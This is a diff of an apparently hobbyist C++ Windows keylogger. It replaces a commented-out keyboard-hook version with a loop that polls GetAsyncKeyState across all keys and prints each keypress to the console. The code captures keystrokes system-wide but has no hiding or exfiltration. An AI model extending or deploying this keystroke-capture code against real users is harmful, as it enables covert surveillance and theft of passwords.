@@ -2,6 +2,9 @@
 #include <fstream>
 #include <Windows.h>
 
+#define NUM_OF_KEYS 255
+
+/*
 HHOOK hkb;
 
 LRESULT  CALLBACK KeyboardProc(int nCode, WPARAM wParam,
@@ -26,9 +29,28 @@ BOOL installhook()
 
     return TRUE;
 }
+*/
+
+int keyWasPressed()
+{
+    int stat = 0;
+
+    for (int i = 0; i < NUM_OF_KEYS; i++)
+    {
+        if (GetAsyncKeyState(i) & 0x1)
+        {
+            stat = i;
+            i = NUM_OF_KEYS;
+        }
+          
+    }
+
+    return stat;
+}
 
 int main()
 {
+    /*
     FILE* file = fopen("K:\\Programming\\keyLogger\\keyLogger\\keyLogger\\report.txt", "w");
     fclose(file);
     installhook();
@@ -39,10 +61,16 @@ int main()
         DispatchMessage(&msg);
     }
 
-
     UnhookWindowsHookEx(hkb);
 
     std::cout << "Done!\n";
+    */ 
+    while(TRUE)
+    {
+
+        std::cout << (char) MapVirtualKey(keyWasPressed(), MAPVK_VK_TO_CHAR);
+        Sleep(120);
+    }
     
 	return 0;
 }
